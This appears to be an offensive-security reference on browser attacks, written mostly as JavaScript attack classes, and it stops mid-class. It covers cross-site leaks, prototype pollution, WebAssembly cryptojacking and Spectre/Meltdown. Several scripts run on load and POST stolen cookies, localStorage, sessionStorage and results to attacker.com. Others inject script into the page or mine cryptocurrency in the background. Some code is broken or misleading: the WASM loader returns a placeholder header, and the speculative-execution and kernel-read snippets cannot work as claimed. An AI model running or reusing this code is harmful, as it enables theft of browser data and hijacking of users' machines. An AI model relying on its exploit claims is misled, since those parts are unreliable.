# The Hostile DOM: Deep Dive Technical Reference

::: danger Offensive Security Research
This document provides **exhaustive technical analysis** of browser-based attack vectors. All code examples are for educational and authorized security research purposes only.
:::

## Document Structure

This document represents the culmination of browser exploitation research, covering advanced attack vectors that push the boundaries of web security.

---

## Part 8: Advanced Attack Vectors

### 8.1 XS-Leaks: Cross-Site Leakage Attacks

XS-Leaks exploit side-channels to leak sensitive information across origins.

#### Cache-Based XS-Leaks

```javascript [Cache-Based XS-Leak Exploitation]
class XSLeakExploiter {
  constructor() {
    this.leakedData = '';
    this.cache = new Map();
  }
  
  // Cache probing attack
  async cacheProbeAttack(targetUrl, probeUrls) {
    console.log('[+] Starting cache probe attack on:', targetUrl);
    
    // First, ensure cache is warm with known content
    await this.warmCache(probeUrls);
    
    // Navigate to target (this will potentially evict cache entries)
    await this.navigateToTarget(targetUrl);
    
    // Probe cache state
    const cacheState = await this.probeCache(probeUrls);
    
    // Infer information from cache state
    const leakedInfo = this.inferFromCacheState(cacheState, probeUrls);
    
    console.log('[+] Cache probe results:', leakedInfo);
    return leakedInfo;
  }
  
  async warmCache(urls) {
    const promises = urls.map(url => 
      fetch(url, { 
        method: 'GET', 
        mode: 'no-cors',
        cache: 'force-cache' 
      })
    );
    
    await Promise.all(promises);
    console.log('[+] Cache warmed with', urls.length, 'entries');
  }
  
  async navigateToTarget(url) {
    return new Promise((resolve) => {
      const iframe = document.createElement('iframe');
      iframe.src = url;
      iframe.style.display = 'none';
      
      iframe.onload = () => {
        // Give it time to load and potentially modify cache
        setTimeout(() => {
          document.body.removeChild(iframe);
          resolve();
        }, 2000);
      };
      
      document.body.appendChild(iframe);
    });
  }
  
  async probeCache(urls) {
    const cacheState = {};
    
    for (const url of urls) {
      const start = performance.now();
      
      try {
        const response = await fetch(url, { 
          method: 'GET',
          mode: 'no-cors',
          cache: 'only-if-cached' // Only use cache
        });
        
        const end = performance.now();
        const cached = response.ok;
        const timing = end - start;
        
        cacheState[url] = { cached, timing };
        
      } catch (error) {
        const end = performance.now();
        cacheState[url] = { cached: false, timing: end - start };
      }
    }
    
    return cacheState;
  }
  
  inferFromCacheState(cacheState, urls) {
    // Analyze which URLs were evicted (not cached anymore)
    const evicted = urls.filter(url => !cacheState[url].cached);
    const cached = urls.filter(url => cacheState[url].cached);
    
    // Analyze timing differences
    const timings = urls.map(url => cacheState[url].timing);
    const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;
    
    return {
      evictedUrls: evicted,
      cachedUrls: cached,
      averageTiming: avgTiming,
      timingVariance: this.calculateVariance(timings),
      inference: this.makeInference(evicted, cached)
    };
  }
  
  makeInference(evicted, cached) {
    // Example inference: if certain URLs are evicted, 
    // it might indicate the user visited specific pages
    if (evicted.length > cached.length) {
      return 'High cache eviction - possible large page load';
    } else if (cached.length > evicted.length) {
      return 'Low cache eviction - possible cached content reuse';
    } else {
      return 'Balanced cache state - normal browsing pattern';
    }
  }
  
  calculateVariance(values) {
    const mean = values.reduce((a, b) => a + b, 0) / values.length;
    const squareDiffs = values.map(value => Math.pow(value - mean, 2));
    return squareDiffs.reduce((a, b) => a + b, 0) / squareDiffs.length;
  }
  
  // Error-based XS-Leak
  async errorBasedLeak(targetUrl) {
    console.log('[+] Starting error-based XS-Leak on:', targetUrl);
    
    const testUrls = [
      `${targetUrl}?leak=1`,
      `${targetUrl}?leak=2`,
      `${targetUrl}?leak=3`
    ];
    
    const results = {};
    
    for (const url of testUrls) {
      try {
        const response = await fetch(url, { 
          mode: 'no-cors',
          credentials: 'include' // Include cookies
        });
        
        results[url] = { 
          status: response.status,
          ok: response.ok,
          type: response.type
        };
        
      } catch (error) {
        results[url] = { 
          error: error.message,
          blocked: error.message.includes('blocked') 
        };
      }
    }
    
    console.log('[+] Error-based leak results:', results);
    return results;
  }
  
  // Frame counting attack
  async frameCountingAttack(targetUrl) {
    console.log('[+] Starting frame counting attack on:', targetUrl);
    
    return new Promise((resolve) => {
      const iframe = document.createElement('iframe');
      iframe.src = targetUrl;
      iframe.style.display = 'none';
      
      let initialFrameCount = window.length;
      
      iframe.onload = () => {
        setTimeout(() => {
          const finalFrameCount = window.length;
          const frameDifference = finalFrameCount - initialFrameCount;
          
          document.body.removeChild(iframe);
          
          const result = {
            initialFrames: initialFrameCount,
            finalFrames: finalFrameCount,
            difference: frameDifference,
            inference: this.inferFromFrameCount(frameDifference)
          };
          
          console.log('[+] Frame counting results:', result);
          resolve(result);
        }, 3000);
      };
      
      document.body.appendChild(iframe);
    });
  }
  
  inferFromFrameCount(difference) {
    if (difference === 0) {
      return 'No additional frames - simple page or blocked';
    } else if (difference === 1) {
      return 'One additional frame - possible embedded content';
    } else if (difference > 1) {
      return `${difference} additional frames - complex page with multiple embeds`;
    }
  }
  
  // Global state probing
  async globalStateLeak(targetUrl) {
    console.log('[+] Starting global state leak on:', targetUrl);
    
    // Record initial state
    const initialState = this.captureGlobalState();
    
    // Load target in iframe
    await this.loadInIframe(targetUrl);
    
    // Record final state
    const finalState = this.captureGlobalState();
    
    // Compare states
    const differences = this.compareStates(initialState, finalState);
    
    console.log('[+] Global state differences:', differences);
    return differences;
  }
  
  captureGlobalState() {
    return {
      localStorage: { ...localStorage },
      sessionStorage: { ...sessionStorage },
      cookies: document.cookie,
      location: { ...location },
      historyLength: history.length,
      frameCount: window.length
    };
  }
  
  async loadInIframe(url) {
    return new Promise((resolve) => {
      const iframe = document.createElement('iframe');
      iframe.src = url;
      iframe.style.display = 'none';
      
      iframe.onload = () => {
        setTimeout(() => {
          document.body.removeChild(iframe);
          resolve();
        }, 2000);
      };
      
      document.body.appendChild(iframe);
    });
  }
  
  compareStates(initial, final) {
    const differences = {};
    
    // Compare localStorage
    const lsKeys = new Set([...Object.keys(initial.localStorage), ...Object.keys(final.localStorage)]);
    differences.localStorage = {};
    
    for (const key of lsKeys) {
      if (initial.localStorage[key] !== final.localStorage[key]) {
        differences.localStorage[key] = {
          initial: initial.localStorage[key],
          final: final.localStorage[key]
        };
      }
    }
    
    // Compare sessionStorage
    const ssKeys = new Set([...Object.keys(initial.sessionStorage), ...Object.keys(final.sessionStorage)]);
    differences.sessionStorage = {};
    
    for (const key of ssKeys) {
      if (initial.sessionStorage[key] !== final.sessionStorage[key]) {
        differences.sessionStorage[key] = {
          initial: initial.sessionStorage[key],
          final: final.sessionStorage[key]
        };
      }
    }
    
    // Compare cookies
    if (initial.cookies !== final.cookies) {
      differences.cookies = {
        initial: initial.cookies,
        final: final.cookies
      };
    }
    
    // Compare other properties
    ['historyLength', 'frameCount'].forEach(prop => {
      if (initial[prop] !== final[prop]) {
        differences[prop] = {
          initial: initial[prop],
          final: final[prop]
        };
      }
    });
    
    return differences;
  }
}

// Initialize XS-Leak exploiter
const xsLeakExploiter = new XSLeakExploiter();

// Example usage
async function runXSLeakAttacks() {
  const targetUrl = 'https://victim.com/profile';
  const probeUrls = [
    'https://victim.com/static/image1.jpg',
    'https://victim.com/static/image2.jpg',
    'https://victim.com/static/image3.jpg'
  ];
  
  // Run cache-based attack
  const cacheResults = await xsLeakExploiter.cacheProbeAttack(targetUrl, probeUrls);
  
  // Run error-based attack
  const errorResults = await xsLeakExploiter.errorBasedLeak(targetUrl);
  
  // Run frame counting attack
  const frameResults = await xsLeakExploiter.frameCountingAttack(targetUrl);
  
  // Run global state leak
  const stateResults = await xsLeakExploiter.globalStateLeak(targetUrl);
  
  // Exfiltrate all results
  fetch('https://attacker.com/xs-leak-results', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      cacheResults,
      errorResults,
      frameResults,
      stateResults,
      timestamp: new Date().toISOString()
    })
  });
}

runXSLeakAttacks();
```

### 8.2 Prototype Pollution Attacks

Prototype pollution exploits JavaScript's prototype chain to inject malicious properties.

#### Prototype Pollution Fundamentals

```javascript [Prototype Pollution Exploitation Framework]
class PrototypePolluter {
  constructor() {
    this.payloads = this.generatePayloads();
    this.vulnerableObjects = this.findVulnerableObjects();
  }
  
  generatePayloads() {
    return {
      // Basic prototype pollution
      basic: {
        '__proto__': {
          'polluted': true,
          'toString': () => 'POLLUTED'
        }
      },
      
      // Constructor pollution
      constructor: {
        'constructor': {
          'prototype': {
            'polluted': true,
            'evilMethod': () => alert('Prototype pollution successful!')
          }
        }
      },
      
      // Deep pollution
      deep: {
        '__proto__': {
          'config': {
            'apiKey': 'evil-api-key',
            'endpoint': 'https://attacker.com'
          },
          'utils': {
            'sanitize': (input) => `<script>alert('${input}')</script>`
          }
        }
      },
      
      // Property override pollution
      override: {
        '__proto__': {
          'toString': () => 'MALICIOUS_OVERRIDE',
          'valueOf': () => 1337,
          'isAdmin': true,
          'isLoggedIn': true
        }
      }
    };
  }
  
  findVulnerableObjects() {
    const vulnerable = [];
    
    // Common vulnerable patterns
    const patterns = [
      // URL parsing libraries
      () => URLSearchParams && new URLSearchParams('__proto__[polluted]=true'),
      
      // Query string parsers
      () => this.testObjectMerge({ '__proto__': { 'polluted': true } }),
      
      // JSON parsers with merge
      () => this.testJSONMerge('{"__proto__": {"polluted": true}}'),
      
      // Template engines
      () => this.testTemplateEngine(),
      
      // Configuration mergers
      () => this.testConfigMerge()
    ];
    
    patterns.forEach((test, index) => {
      try {
        const result = test();
        if (result && {}.polluted === true) {
          vulnerable.push(`pattern_${index}`);
          // Clean up
          delete Object.prototype.polluted;
        }
      } catch (error) {
        // Pattern not vulnerable or threw error
      }
    });
    
    return vulnerable;
  }
  
  testObjectMerge(obj) {
    // Test common merge patterns
    const target = {};
    
    // Object.assign pattern
    Object.assign(target, obj);
    
    // Spread operator pattern
    const spread = { ...obj };
    
    // jQuery.extend pattern (if available)
    if (window.jQuery && jQuery.extend) {
      jQuery.extend(target, obj);
    }
    
    // Lodash merge pattern (if available)
    if (window._ && _.merge) {
      _.merge(target, obj);
    }
    
    return target;
  }
  
  testJSONMerge(jsonString) {
    try {
      const obj = JSON.parse(jsonString);
      return this.testObjectMerge(obj);
    } catch (error) {
      return null;
    }
  }
  
  testTemplateEngine() {
    // Test Handlebars-style templates
    if (window.Handlebars) {
      try {
        const template = Handlebars.compile('{{__proto__.polluted}}');
        const result = template({ '__proto__': { 'polluted': 'TEMPLATE_POLLUTED' } });
        return result;
      } catch (error) {
        return null;
      }
    }
    
    return null;
  }
  
  testConfigMerge() {
    // Test configuration merging patterns
    const defaultConfig = {
      api: {
        endpoint: 'https://api.example.com',
        timeout: 5000
      },
      features: {
        logging: false,
        analytics: true
      }
    };
    
    const userConfig = {
      '__proto__': {
        'api': {
          'endpoint': 'https://attacker.com'
        }
      }
    };
    
    // Deep merge pattern
    const merged = this.deepMerge(defaultConfig, userConfig);
    return merged;
  }
  
  deepMerge(target, source) {
    for (const key in source) {
      if (source[key] && typeof source[key] === 'object') {
        target[key] = target[key] || {};
        this.deepMerge(target[key], source[key]);
      } else {
        target[key] = source[key];
      }
    }
    return target;
  }
  
  // Execute prototype pollution
  async executePollution(targetFunc, payload) {
    console.log('[+] Executing prototype pollution');
    
    try {
      // Apply payload
      await targetFunc(payload);
      
      // Verify pollution
      const verification = this.verifyPollution();
      
      if (verification.polluted) {
        console.log('[+] Prototype pollution successful:', verification);
        
        // Execute post-pollution attacks
        await this.postPollutionAttacks();
        
        return verification;
      } else {
        console.log('[-] Prototype pollution failed');
        return { success: false };
      }
      
    } catch (error) {
      console.log('[-] Prototype pollution error:', error);
      return { success: false, error: error.message };
    }
  }
  
  verifyPollution() {
    const tests = {
      basic: {}.polluted === true,
      constructor: ({}).constructor.prototype.polluted === true,
      toString: {}.toString() === 'POLLUTED',
      isAdmin: {}.isAdmin === true,
      config: {}.config && {}.config.apiKey === 'evil-api-key'
    };
    
    return {
      polluted: Object.values(tests).some(test => test),
      tests: tests
    };
  }
  
  async postPollutionAttacks() {
    console.log('[+] Executing post-pollution attacks');
    
    // Attack 1: Override native methods
    if ({}.toString() === 'POLLUTED') {
      console.log('[+] Native method override successful');
      
      // This could cause issues in JSON.stringify, logging, etc.
    }
    
    // Attack 2: Configuration poisoning
    if ({}.config && {}.config.endpoint === 'https://attacker.com') {
      console.log('[+] Configuration poisoned');
      
      // API calls now go to attacker
      fetch('/api/data').then(response => {
        // This request goes to attacker.com instead of legitimate API
        console.log('[+] Poisoned API call made');
      });
    }
    
    // Attack 3: Authentication bypass
    if ({}.isAdmin === true) {
      console.log('[+] Authentication bypass possible');
      
      // User objects might now have isAdmin: true
    }
    
    // Attack 4: XSS via sanitization bypass
    if ({}.utils && {}.utils.sanitize) {
      const maliciousInput = 'evil';
      const sanitized = {}.utils.sanitize(maliciousInput);
      console.log('[+] Sanitization bypassed:', sanitized);
      
      // Could lead to XSS if output is inserted into DOM
      document.body.innerHTML += sanitized;
    }
  }
  
  // Gadget discovery
  findGadgets() {
    const gadgets = [];
    
    // Common gadget patterns
    const gadgetPatterns = [
      // jQuery gadgets
      () => {
        if (window.jQuery) {
          // jQuery.extend is a common gadget
          jQuery.extend({}, { '__proto__': { 'gadget': true } });
          return {}.gadget === true ? 'jQuery.extend' : null;
        }
      },
      
      // Lodash gadgets
      () => {
        if (window._ && _.merge) {
          _.merge({}, { '__proto__': { 'gadget': true } });
          return {}.gadget === true ? 'lodash.merge' : null;
        }
      },
      
      // Vue.js gadgets
      () => {
        if (window.Vue) {
          // Vue.set can be a gadget in some versions
          try {
            Vue.set({}, '__proto__', { 'gadget': true });
            return {}.gadget === true ? 'Vue.set' : null;
          } catch (error) {
            return null;
          }
        }
      },
      
      // Express.js gadgets (server-side but can affect client)
      () => {
        // Look for Express-like merge patterns
        const test = {};
        if (typeof test === 'object' && test !== null) {
          Object.assign(test, { '__proto__': { 'gadget': true } });
          return {}.gadget === true ? 'Object.assign' : null;
        }
      }
    ];
    
    gadgetPatterns.forEach(pattern => {
      try {
        const gadget = pattern();
        if (gadget) {
          gadgets.push(gadget);
          // Clean up
          delete Object.prototype.gadget;
        }
      } catch (error) {
        // Gadget not available or threw error
      }
    });
    
    console.log('[+] Found gadgets:', gadgets);
    return gadgets;
  }
  
  // Automated exploitation
  async autoExploit() {
    console.log('[+] Starting automated prototype pollution exploitation');
    
    const gadgets = this.findGadgets();
    const results = [];
    
    for (const gadget of gadgets) {
      for (const [name, payload] of Object.entries(this.payloads)) {
        try {
          const result = await this.executePollution(
            (p) => this.applyToGadget(gadget, p),
            payload
          );
          
          results.push({
            gadget,
            payload: name,
            result
          });
          
        } catch (error) {
          results.push({
            gadget,
            payload: name,
            error: error.message
          });
        }
      }
    }
    
    console.log('[+] Exploitation results:', results);
    
    // Exfiltrate results
    fetch('https://attacker.com/prototype-pollution-results', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        results,
        vulnerableObjects: this.vulnerableObjects,
        timestamp: new Date().toISOString()
      })
    });
    
    return results;
  }
  
  applyToGadget(gadget, payload) {
    switch (gadget) {
      case 'jQuery.extend':
        return jQuery.extend({}, payload);
      case 'lodash.merge':
        return _.merge({}, payload);
      case 'Object.assign':
        return Object.assign({}, payload);
      default:
        throw new Error(`Unknown gadget: ${gadget}`);
    }
  }
}

// Initialize prototype polluter
const prototypePolluter = new PrototypePolluter();

// Run automated exploitation
prototypePolluter.autoExploit();
```

### 8.3 WebAssembly Exploitation

WebAssembly provides near-native performance and can be exploited for advanced attacks.

#### WASM-Based Computation Attacks

```javascript [WebAssembly Exploitation]
class WASMExploiter {
  constructor() {
    this.wasmModule = null;
    this.memory = null;
  }
  
  // Load malicious WebAssembly module
  async loadMaliciousWASM() {
    console.log('[+] Loading malicious WebAssembly module');
    
    // WebAssembly binary that performs malicious operations
    const wasmBinary = this.generateMaliciousWASM();
    
    try {
      const result = await WebAssembly.instantiate(wasmBinary, {
        env: {
          // Import functions from JavaScript
          log: (ptr) => console.log('[WASM]', this.readString(ptr)),
          steal: (ptr) => this.stealData(this.readString(ptr)),
          exfiltrate: (ptr, len) => this.exfiltrateData(ptr, len)
        }
      });
      
      this.wasmModule = result.instance;
      this.memory = this.wasmModule.exports.memory;
      
      console.log('[+] Malicious WASM module loaded');
      return true;
      
    } catch (error) {
      console.log('[-] Failed to load WASM module:', error);
      return false;
    }
  }
  
  generateMaliciousWASM() {
    // This would be a compiled WebAssembly binary
    // For demonstration, we'll use a simple module
    const wasmCode = `
      (module
        (import "env" "log" (func $log (param i32)))
        (import "env" "steal" (func $steal (param i32)))
        (import "env" "exfiltrate" (func $exfiltrate (param i32 i32)))
        
        (memory (export "memory") 1)
        
        (data (i32.const 0) "Malicious WASM executing!")
        (data (i32.const 32) "Stolen data")
        
        (func (export "malicious_main")
          i32.const 0
          call $log
          
          i32.const 32
          call $steal
        )
        
        (func (export "compute_hash") (param $input i32) (param $len i32) (result i32)
          (local $hash i32)
          (local $i i32)
          
          i32.const 5381
          local.set $hash
          
          local.get $i
          local.get $len
          i32.lt_s
          if
            loop
              local.get $hash
              i32.const 33
              i32.mul
              local.get $input
              local.get $i
              i32.add
              i32.load8_u
              i32.xor
              local.set $hash
              
              local.get $i
              i32.const 1
              i32.add
              local.set $i
              
              local.get $i
              local.get $len
              i32.lt_s
              br_if 0
            end
          end
          
          local.get $hash
        )
      )
    `;
    
    // Convert WAT to WASM (this is simplified)
    return this.watToWasm(wasmCode);
  }
  
  watToWasm(watCode) {
    // In a real implementation, this would use wabt.js or similar
    // For now, return a placeholder
    console.log('[*] Converting WAT to WASM (placeholder)');
    return new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]); // Minimal WASM header
  }
  
  readString(ptr) {
    const view = new Uint8Array(this.memory.buffer);
    let str = '';
    let i = ptr;
    
    while (view[i] !== 0) {
      str += String.fromCharCode(view[i]);
      i++;
    }
    
    return str;
  }
  
  stealData(type) {
    console.log(`[+] WASM stealing ${type}`);
    
    switch (type) {
      case 'cookies':
        return document.cookie;
      case 'localStorage':
        return JSON.stringify(localStorage);
      case 'location':
        return location.href;
      default:
        return 'unknown_data_type';
    }
  }
  
  exfiltrateData(ptr, len) {
    const view = new Uint8Array(this.memory.buffer);
    const data = view.slice(ptr, ptr + len);
    
    fetch('https://attacker.com/wasm-data', {
      method: 'POST',
      body: data
    });
  }
  
  // Execute WASM-based attacks
  async executeWASMStealth() {
    if (!this.wasmModule) {
      await this.loadMaliciousWASM();
    }
    
    console.log('[+] Executing WASM stealth operations');
    
    try {
      // Run main malicious function
      this.wasmModule.exports.malicious_main();
      
      // Use WASM for computation
      const testData = 'sensitive_data';
      const dataPtr = this.allocateString(testData);
      const hash = this.wasmModule.exports.compute_hash(dataPtr, testData.length);
      
      console.log(`[+] WASM computed hash: ${hash}`);
      
      // Exfiltrate hash
      this.exfiltrateData(dataPtr, testData.length);
      
    } catch (error) {
      console.log('[-] WASM execution error:', error);
    }
  }
  
  allocateString(str) {
    const bytes = new TextEncoder().encode(str + '\0');
    const ptr = this.wasmModule.exports.allocate(bytes.length);
    
    const view = new Uint8Array(this.memory.buffer);
    view.set(bytes, ptr);
    
    return ptr;
  }
  
  // WASM-based cryptojacking
  async wasmCryptoJack() {
    console.log('[+] Starting WASM-based cryptojacking');
    
    const cryptoWasm = `
      (module
        (func (export "mine") (param $nonce i32) (result i32)
          (local $hash i32)
          (local $i i32)
          
          i32.const 0
          local.set $hash
          
          local.get $i
          i32.const 1000000  ;; Mining difficulty
          i32.lt_s
          if
            loop
              local.get $hash
              local.get $nonce
              i32.add
              local.get $i
              i32.xor
              local.set $hash
              
              local.get $i
              i32.const 1
              i32.add
              local.set $i
              
              local.get $i
              i32.const 1000000
              i32.lt_s
              br_if 0
            end
          end
          
          local.get $hash
        )
      )
    `;
    
    try {
      const cryptoModule = await WebAssembly.instantiate(this.watToWasm(cryptoWasm));
      
      // Mine in background
      setInterval(() => {
        const nonce = Math.floor(Math.random() * 1000000);
        const result = cryptoModule.instance.exports.mine(nonce);
        
        // Send mining results to attacker (proof of work)
        fetch('https://attacker.com/mining-result', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ nonce, result })
        });
      }, 100);
      
      console.log('[+] WASM cryptojacking active');
      
    } catch (error) {
      console.log('[-] WASM cryptojacking failed:', error);
    }
  }
  
  // WASM memory corruption
  async wasmMemoryCorruption() {
    console.log('[+] Attempting WASM memory corruption');
    
    if (!this.memory) return;
    
    try {
      // Access memory directly
      const view = new Uint32Array(this.memory.buffer);
      
      // Attempt to corrupt memory boundaries
      for (let i = 0; i < 100; i++) {
        const randomAddr = Math.floor(Math.random() * view.length);
        view[randomAddr] = 0xDEADBEEF; // Corruption marker
      }
      
      console.log('[+] Memory corruption applied');
      
      // Try to trigger use-after-free or other memory issues
      this.wasmModule.exports.malicious_main();
      
    } catch (error) {
      console.log('[+] Memory corruption caused exception:', error.message);
    }
  }
}

// Initialize WASM exploiter
const wasmExploiter = new WASMExploiter();

// Run WASM attacks
async function runWASMAttacks() {
  await wasmExploiter.executeWASMStealth();
  await wasmExploiter.wasmCryptoJack();
  await wasmExploiter.wasmMemoryCorruption();
}

runWASMAttacks();
```

### 8.4 Spectre and Meltdown Variants

Modern CPUs use **speculative execution** to improve performance by predicting code paths before conditional checks complete. These predictions leave microarchitectural side effects that can leak sensitive data across security boundaries.

::: danger Browser Context Limitations
Browser-based implementations of these attacks face significant challenges:
- **Timing precision**: `performance.now()` is clamped to milliseconds with jitter
- **No direct memory access**: JavaScript cannot access arbitrary physical memory
- **Limited control**: No inline assembly or precise cache control
- **SharedArrayBuffer restrictions**: Required for high-resolution timing, disabled by default

However, WebAssembly provides near-native execution speed and some attacks remain viable.
:::

#### Spectre Variant 1: Bounds Check Bypass (CVE-2017-5753)

**Attack Principle**: Train branch predictor to expect in-bounds array access, then trigger speculative out-of-bounds read that leaks data via cache side channel.

```javascript [Spectre-v1: Bounds Check Bypass]
// Spectre Variant 1 (Bounds Check Bypass)
class SpectreV1Exploiter {
  constructor() {
    this.probeArray = new Uint8Array(256 * 512); // 256 possible byte values
    this.trainingIterations = 100;
    this.secretData = null;
  }
  
  // Setup victim array with secret data
  initializeVictimArray() {
    // Simulate victim's memory containing secrets
    this.secretData = new Uint8Array([
      0x53, 0x65, 0x63, 0x72, 0x65, 0x74, // "Secret"
      0x20, 0x44, 0x61, 0x74, 0x61, 0x21  // " Data!"
    ]);
    
    console.log('[+] Victim data initialized');
  }
  
  // Train branch predictor with in-bounds accesses
  trainBranchPredictor(validIndex) {
    // Bounds check (will be predicted as "always true")
    if (validIndex < this.secretData.length) {
      const value = this.secretData[validIndex];
      // Access probe array at offset determined by secret value
      // This creates cache side effect
      const probeIndex = value * 512;
      this.probeArray[probeIndex] = 1;
    }
  }
  
  // Flush entire probe array from cache
  flushProbeArray() {
    // Access large memory region to evict probe array
    const flushBuffer = new Uint8Array(10 * 1024 * 1024); // 10MB
    for (let i = 0; i < flushBuffer.length; i += 64) {
      flushBuffer[i] = 1;
    }
  }
  
  // Speculative out-of-bounds access
  speculativeAccess(maliciousIndex) {
    // CPU speculatively executes this before bounds check completes
    // Even though this violates bounds, speculative execution proceeds
    if (maliciousIndex < this.secretData.length) {
      // This check will eventually fail, but speculation happens first
      const value = this.secretData[maliciousIndex];
      const probeIndex = value * 512;
      this.probeArray[probeIndex] = 1; // Cache line loaded
    }
  }
  
  // Time access to each probe array element
  probeCache() {
    const timings = [];
    
    for (let i = 0; i < 256; i++) {
      const probeIndex = i * 512;
      
      // Time the access
      const start = performance.now();
      const value = this.probeArray[probeIndex];
      const end = performance.now();
      
      // Prevent compiler optimization
      if (value === 999) console.log('unreachable');
      
      timings.push({
        byteValue: i,
        accessTime: end - start
      });
    }
    
    // Sort by access time (cached = faster)
    timings.sort((a, b) => a.accessTime - b.accessTime);
    
    return timings;
  }
  
  // Full attack chain
  async attack(secretOffset) {
    console.log(`[+] Attempting Spectre-v1 attack on offset ${secretOffset}`);
    
    this.initializeVictimArray();
    
    // Phase 1: Train branch predictor
    console.log('[+] Training branch predictor...');
    for (let i = 0; i < this.trainingIterations; i++) {
      const validIndex = i % this.secretData.length;
      this.trainBranchPredictor(validIndex);
    }
    
    // Phase 2: Flush probe array from cache
    console.log('[+] Flushing probe array from cache...');
    this.flushProbeArray();
    
    // Phase 3: Trigger speculative execution
    console.log('[+] Triggering speculative out-of-bounds access...');
    const maliciousIndex = this.secretData.length + secretOffset;
    this.speculativeAccess(maliciousIndex);
    
    // Phase 4: Probe cache to recover leaked byte
    console.log('[+] Probing cache...');
    const timings = this.probeCache();
    
    // The fastest access reveals the leaked byte
    const leakedByte = timings[0].byteValue;
    const confidence = timings[1].accessTime - timings[0].accessTime;
    
    console.log(`[+] Leaked byte: 0x${leakedByte.toString(16)} ('${String.fromCharCode(leakedByte)}')`);
    console.log(`[+] Confidence margin: ${confidence.toFixed(3)}ms`);
    
    return {
      value: leakedByte,
      char: String.fromCharCode(leakedByte),
      confidence: confidence
    };
  }
}
```

#### Spectre Variant 2: Branch Target Injection (CVE-2017-5715)

**Attack Principle**: Poison Indirect Branch Predictor (IBP) to make victim code speculatively execute attacker-chosen gadget code.

```javascript [Spectre-v2: Branch Target Injection]
class SpectreV2Exploiter {
  constructor() {
    this.gadgets = [];
    this.indirectCallSite = null;
  }
  
  // Setup gadget chain for speculative execution
  setupGadgets() {
    // Gadget 1: Load secret into register
    this.gadgets.push({
      name: 'secretLoad',
      code: (secretAddr) => {
        const view = new Uint8Array(secretAddr);
        return view[0]; // Load secret byte
      }
    });
    
    // Gadget 2: Use secret as array index
    this.gadgets.push({
      name: 'arrayIndex',
      code: (secretValue) => {
        const probe = new Uint8Array(256 * 512);
        probe[secretValue * 512] = 1; // Create cache side effect
      }
    });
    
    console.log('[+] Gadget chain prepared');
  }
  
  // Train Indirect Branch Predictor
  trainIBP(targetFunction) {
    // Repeatedly call indirect branch with same target
    for (let i = 0; i < 1000; i++) {
      this.indirectCallSite = targetFunction;
      this.indirectCallSite(); // Train predictor
    }
  }
  
  // Trigger misprediction to execute gadget
  poisonIBP(gadgetFunction) {
    // Switch target of indirect call
    this.indirectCallSite = gadgetFunction;
    
    // CPU will speculatively execute old target (our gadget)
    // even though actual target changed
    this.indirectCallSite();
  }
  
  async attack() {
    console.log('[+] Spectre-v2 (Branch Target Injection) attack');
    
    this.setupGadgets();
    
    // Train IBP with benign function
    const benignFunc = () => {
      return Math.random();
    };
    
    this.trainIBP(benignFunc);
    
    // Poison with malicious gadget
    this.poisonIBP(this.gadgets[0].code);
    
    console.log('[+] IBP poisoning complete');
  }
}
```

#### Spectre Variant 4: Speculative Store Bypass (CVE-2018-3639)

**Attack Principle**: Speculatively load stale data before store commits, bypassing memory ordering protections.

```javascript [Spectre-v4: Speculative Store Bypass]
class SpectreV4Exploiter {
  constructor() {
    this.sharedMemory = new SharedArrayBuffer(1024);
    this.view = new Uint8Array(this.sharedMemory);
  }
  
  // Victim code with store operation
  victimStore(index, value) {
    // Store operation (takes time to commit)
    Atomics.store(this.view, index, value);
  }
  
  // Speculative load before store commits
  speculativeLoad(index) {
    // CPU may speculatively load old value
    // before store from victimStore() commits
    const start = performance.now();
    const value = Atomics.load(this.view, index);
    const end = performance.now();
    
    return { value, timing: end - start };
  }
  
  async attack() {
    console.log('[+] Spectre-v4 (Store Bypass) attack');
    
    // Setup: Write initial value
    const targetIndex = 42;
    this.view[targetIndex] = 0xAA; // Old value
    
    // Victim updates value
    this.victimStore(targetIndex, 0xBB); // New value
    
    // Speculative load may see old value (0xAA)
    const result = this.speculativeLoad(targetIndex);
    
    if (result.value === 0xAA) {
      console.log('[!] Leaked stale value via speculative bypass');
    }
    
    return result;
  }
}
```

#### Meltdown (CVE-2017-5754): Kernel Memory Leakage

**Attack Principle**: Speculatively access kernel memory from user space, leak data via cache before exception triggers.

```javascript [Meltdown Conceptual Implementation]
class MeltdownExploiter {
  constructor() {
    this.probeArray = new Uint8Array(256 * 4096); // Page-aligned
  }
  
  // Attempt to read kernel memory (will fault, but speculation happens first)
  speculativeKernelRead(kernelAddress) {
    try {
      // In native code, this would be:
      // mov rax, [kernelAddress]  ; Speculative kernel read
      // shl rax, 12               ; Multiply by page size
      // mov rbx, [probeArray + rax] ; Cache probe array line
      
      // JavaScript approximation (requires WASM for real attack)
      const view = new Uint8Array(kernelAddress);
      const value = view[0]; // This will throw exception
      
      // This never executes in committed path,
      // but CPU speculatively executes it
      const probeIndex = value * 4096;
      this.probeArray[probeIndex] = 1;
      
    } catch (e) {
      // Exception caught, but cache side effect remains
      console.log('[+] Exception caught (expected)');
    }
  }
  
  // Probe cache to recover leaked kernel byte
  probeForLeakedByte() {
    const timings = [];
    
    for (let i = 0; i < 256; i++) {
      const probeIndex = i * 4096;
      const start = performance.now();
      const value = this.probeArray[probeIndex];
      const end = performance.now();
      
      timings.push({ byte: i, time: end - start });
    }
    
    timings.sort((a, b) => a.time - b.time);
    return timings[0].byte; // Fastest = cached = leaked value
  }
  
  async attack(kernelAddr) {
    console.log('[+] Meltdown attack (conceptual)');
    console.log('[!] Note: JavaScript cannot access kernel memory directly');
    console.log('[!] Real attack requires native code/WASM');
    
    // Flush probe array
    for (let i = 0; i < this.probeArray.length; i += 64) {
      this.probeArray[i] = 0;
    }
    
    // Attempt speculative kernel read
    this.speculativeKernelRead(kernelAddr);
    
    // Recover leaked byte from cache
    const leakedByte = this.probeForLeakedByte();
    
    console.log(`[+] Potentially leaked byte: 0x${leakedByte.toString(16)}`);
    return leakedByte;
  }
}
```

#### Foreshadow/L1TF (CVE-2018-3615): L1 Cache Data Leakage

**Attack Principle**: Exploit L1 Terminal Fault to read cached data from SGX enclaves, SMM memory, or other VMs.

```javascript [Foreshadow/L1TF Conceptual Attack]
class ForeshadowExploiter {
  constructor() {
